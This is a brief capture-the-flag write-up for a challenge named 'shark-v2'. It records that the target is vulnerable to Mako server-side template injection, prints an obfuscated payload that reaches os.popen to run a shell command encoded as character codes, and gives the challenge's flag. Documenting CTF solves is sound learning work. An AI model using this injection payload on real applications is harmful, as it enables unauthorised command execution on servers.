# shark-v2

After testing if it is mako ssti again just like in [[shark.md]] I found out it was.
I tried the payload from shark that gave me the flag and I was disappointed it worked and I had noting else to search for.
```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,102,108,97,103])).read()}
```

flag: `CTF{d40de1849fdcdc50b34e23b5acb874aabd8c106c43d837f1d42b12336a51dee0}`